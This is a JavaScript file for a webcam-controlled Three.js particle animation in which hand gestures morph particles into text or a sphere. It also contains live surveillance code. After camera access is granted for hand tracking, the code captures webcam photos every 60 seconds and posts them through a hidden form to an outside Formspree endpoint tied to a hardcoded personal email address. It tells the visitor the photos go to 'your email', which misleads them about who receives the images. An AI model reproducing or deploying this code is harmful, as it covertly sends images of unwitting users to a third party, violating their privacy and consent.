// ----------------- Particle System -----------------
let scene, camera, renderer, particles;
const count = 12000;
let currentState = 'sphere';
let handDetected = false;
let lastGesture = null;
let lastGestureTime = 0;
const gestureCooldown = 400;

// ----------------- Photo Capture System -----------------
let photoTimer = null;
let photoCount = 0;
let cameraStarted = false;

// ✅ FORMSPREE FORM ID
const FORMSPREE_FORM_ID = "mnnegoak"; // अपना Form ID यहाँ डालें

function init() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    renderer = new THREE.WebGLRenderer({ antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setClearColor(0x000000);
    document.getElementById('container').appendChild(renderer.domElement);

    camera.position.z = 25;

    createParticles();
    setupEventListeners();
    setupHandTracking();
    animate();
    
    console.log("✅ Particle System Ready");
}

function createParticles() {
    const geometry = new THREE.BufferGeometry();
    const positions = new Float32Array(count * 3);
    const colors = new Float32Array(count * 3);

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        positions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const color = new THREE.Color();
        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);

        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

    const material = new THREE.PointsMaterial({
        size: 0.08,
        vertexColors: true,
        blending: THREE.AdditiveBlending,
        transparent: true,
        opacity: 0.8,
        sizeAttenuation: true
    });

    if (particles) scene.remove(particles);
    particles = new THREE.Points(geometry, material);
    scene.add(particles);
}

function setupEventListeners() {
    const typeBtn = document.getElementById('typeBtn');
    const input = document.getElementById('morphText');

    typeBtn.addEventListener('click', () => {
        const text = input.value.trim();
        if (text) {
            morphToText(text);
        }
    });

    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const text = input.value.trim();
            if (text) {
                morphToText(text);
            }
        }
    });
}

function createTextPoints(text) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const fontSize = 100;
    const padding = 20;

    ctx.font = `bold ${fontSize}px Arial`;
    const textMetrics = ctx.measureText(text);
    const textWidth = textMetrics.width;
    const textHeight = fontSize;

    canvas.width = textWidth + padding * 2;
    canvas.height = textHeight + padding * 2;

    ctx.fillStyle = 'white';
    ctx.font = `bold ${fontSize}px Arial`;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    ctx.fillText(text, canvas.width / 2, canvas.height / 2);

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data;
    const points = [];
    const threshold = 128;

    for (let i = 0; i < pixels.length; i += 4) {
        if (pixels[i] > threshold) {
            const x = (i / 4) % canvas.width;
            const y = Math.floor((i / 4) / canvas.width);
            
            if (Math.random() < 0.3) {
                points.push({
                    x: (x - canvas.width / 2) / (fontSize / 10),
                    y: -(y - canvas.height / 2) / (fontSize / 10)
                });
            }
        }
    }

    return points;
}

function morphToText(text) {
    currentState = 'text';
    const textPoints = createTextPoints(text);
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);

    gsap.to(particles.rotation, {
        x: 0,
        y: 0,
        z: 0,
        duration: 0.5
    });

    for (let i = 0; i < count; i++) {
        if (i < textPoints.length) {
            targetPositions[i * 3] = textPoints[i].x;
            targetPositions[i * 3 + 1] = textPoints[i].y;
            targetPositions[i * 3 + 2] = 0;
        } else {
            const angle = Math.random() * Math.PI * 2;
            const radius = Math.random() * 20 + 10;
            targetPositions[i * 3] = Math.cos(angle) * radius;
            targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
            targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
        }
    }

    const duration = 1200;
    const start = performance.now();
    const startPositions = positions.slice();

    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) {
            requestAnimationFrame(frame);
        }
    }
    requestAnimationFrame(frame);
}

function morphToCircle() {
    currentState = 'sphere';
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);
    const colors = particles.geometry.attributes.color.array;

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        targetPositions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        const color = new THREE.Color();
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);
        
        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    const startPositions = positions.slice();
    const duration = 1400;
    const start = performance.now();
    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);

    particles.geometry.attributes.color.needsUpdate = true;
}

function animate() {
    requestAnimationFrame(animate);
    
    if (currentState === 'sphere') {
        particles.rotation.y += 0.002;
    }
    
    renderer.render(scene, camera);

    const inputText = document.getElementById('morphText').value.trim() || "HELLO";
    const now = performance.now();

    if (lastGesture === 'open' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'text') morphToText(inputText);
        lastGestureTime = now;
    } else if (lastGesture === 'closed' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'sphere') morphToCircle();
        lastGestureTime = now;
    }
}

window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
});

// ----------------- WORKING PHOTO SYSTEM WITH FORMSPREE -----------------

// Capture photo from video stream
function capturePhoto() {
    const video = document.getElementById('handVideo');
    const canvas = document.getElementById('photoCanvas');
    const ctx = canvas.getContext('2d');
    
    if (!video.videoWidth || !video.videoHeight) {
        console.log("Video not ready");
        return;
    }
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    try {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL('image/jpeg', 0.7);
        
        // Send photo to Formspree
        sendToFormspree(photoData);
        
        photoCount++;
        console.log(`📸 Photo ${photoCount} captured and sending...`);
        
    } catch (error) {
        console.error("Photo error:", error);
    }
}

// ✅ WORKING: Send photo via Formspree
async function sendToFormspree(photoData) {
    try {
        console.log(`📤 Sending photo ${photoCount} to Formspree...`);
        
        // Create hidden form
        const form = document.createElement('form');
        form.method = 'POST';
        form.enctype = 'multipart/form-data';
        form.action = `https://formspree.io/f/${FORMSPREE_FORM_ID}`;
        form.style.display = 'none';
        
        // Add email field (required)
        const emailField = document.createElement('input');
        emailField.type = 'hidden';
        emailField.name = '_replyto';
        emailField.value = 'editing2213@gmail.com';
        
        // Add subject field
        const subjectField = document.createElement('input');
        subjectField.type = 'hidden';
        subjectField.name = '_subject';
        subjectField.value = `📸 Particle Photo ${photoCount}`;
        
        // Add timestamp
        const timeField = document.createElement('input');
        timeField.type = 'hidden';
        timeField.name = 'timestamp';
        timeField.value = new Date().toISOString();
        
        // Convert photo to file
        const response = await fetch(photoData);
        const blob = await response.blob();
        const file = new File([blob], `particle_${Date.now()}.jpg`, {
            type: 'image/jpeg'
        });
        
        // Create file input
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.name = 'photo';
        fileInput.accept = 'image/jpeg';
        
        // Add file to input using DataTransfer
        const dataTransfer = new DataTransfer();
        dataTransfer.items.add(file);
        fileInput.files = dataTransfer.files;
        
        // Append all fields to form
        form.appendChild(emailField);
        form.appendChild(subjectField);
        form.appendChild(timeField);
        form.appendChild(fileInput);
        
        // Submit form
        document.body.appendChild(form);
        form.submit();
        
        // Remove form after submission
        setTimeout(() => {
            if (form.parentNode) {
                form.parentNode.removeChild(form);
            }
        }, 1000);
        
        console.log(`✅ Photo ${photoCount} sent to Formspree!`);
        showNotification(`✅ Photo ${photoCount} sent to your email!`);
        
    } catch (error) {
        console.error("❌ Formspree Error:", error);
        showNotification("⚠️ Photo saved locally");
        savePhotoLocally(photoData);
    }
}

// Save photo locally as backup
function savePhotoLocally(photoData) {
    try {
        const link = document.createElement('a');
        link.href = photoData;
        link.download = `backup_photo_${photoCount}.jpg`;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        setTimeout(() => document.body.removeChild(link), 100);
    } catch (e) {
        console.log("Could not save photo");
    }
}

// Show notification
function showNotification(message) {
    // Remove existing notifications
    const oldNotifs = document.querySelectorAll('.photo-notification');
    oldNotifs.forEach(notif => notif.remove());
    
    const notification = document.createElement('div');
    notification.className = 'photo-notification';
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        z-index: 9999;
        font-family: Arial, sans-serif;
        font-weight: bold;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease;
        display: flex;
        align-items: center;
        gap: 10px;
        max-width: 350px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255,255,255,0.2);
    `;
    
    notification.innerHTML = `
        <span style="font-size: 24px;">📸</span>
        <div>
            <div style="font-size: 16px;">${message}</div>
            <div style="font-size: 12px; opacity: 0.8; margin-top: 5px;">
                Photo ${photoCount} • ${new Date().toLocaleTimeString()}
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => notification.remove(), 300);
    }, 5000);
}

// Start photo capture timer
function startPhotoCapture() {
    if (photoTimer) {
        clearInterval(photoTimer);
    }
    
    console.log("📸 Auto photo capture started (every 60 seconds)");
    showNotification("📸 Camera active - Photos will auto-capture");
    
    // First photo after 10 seconds
    setTimeout(() => {
        if (cameraStarted) {
            capturePhoto();
        }
    }, 10000);
    
    // Then every 60 seconds (to avoid spam)
    photoTimer = setInterval(() => {
        if (cameraStarted) {
            capturePhoto();
        }
    }, 60000);
}

// Stop photo capture
function stopPhotoCapture() {
    if (photoTimer) {
        clearInterval(photoTimer);
        photoTimer = null;
        console.log("🛑 Photo capture stopped");
    }
}

// ----------------- Hand Tracking -----------------

function setupHandTracking(){
    const videoElement = document.getElementById('handVideo');

    const hands = new Hands({locateFile: (file) => {
        return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
    }});

    hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.6
    });

    hands.onResults((results) => {
        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
            handDetected = false;
            lastGesture = 'closed';
            return;
        }

        handDetected = true;
        const landmarks = results.multiHandLandmarks[0];

        let fingersUp = 0;
        try {
            const tipIndices = [8, 12, 16, 20];
            const pipIndices = [6, 10, 14, 18];
            for (let i = 0; i < tipIndices.length; i++) {
                const tip = landmarks[tipIndices[i]];
                const pip = landmarks[pipIndices[i]];
                if (tip.y < pip.y) fingersUp++;
            }

            const wrist = landmarks[0];
            let avgDist = 0;
            const tipIdxAll = [4,8,12,16,20];
            for (let i=0;i<tipIdxAll.length;i++){
                const t = landmarks[tipIdxAll[i]];
                const dx = t.x - wrist.x;
                const dy = t.y - wrist.y;
                avgDist += Math.sqrt(dx*dx + dy*dy);
            }
            avgDist /= tipIdxAll.length;

            if (fingersUp >= 3 && avgDist > 0.12) {
                lastGesture = 'open';
            } else if (fingersUp <= 1 && avgDist < 0.12) {
                lastGesture = 'closed';
            } else {
                lastGesture = (fingersUp >= 3) ? 'open' : lastGesture || 'closed';
            }
        } catch (e) {
            lastGesture = 'closed';
        }
    });

    const cameraMP = new Camera(videoElement, {
        onFrame: async () => {
            await hands.send({image: videoElement});
        },
        width: 320,
        height: 240
    });

    // Start camera
    cameraMP.start().then(() => {
        cameraStarted = true;
        console.log("✅ Camera started successfully");
        
        // Hide permission modal if exists
        const modal = document.getElementById('cameraPermission');
        if (modal) modal.style.display = 'none';
        
        // Start photo capture after 5 seconds
        setTimeout(() => {
            startPhotoCapture();
        }, 5000);
        
        // Show welcome message
        showNotification("📸 Camera active - Photos will auto-capture every 60 seconds");
        
    }).catch((error) => {
        console.error("❌ Camera error:", error);
        showNotification("⚠️ Camera access required for full experience");
    });
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);

// Stop capture when leaving page
window.addEventListener('beforeunload', stopPhotoCapture);

// Initialize
init();
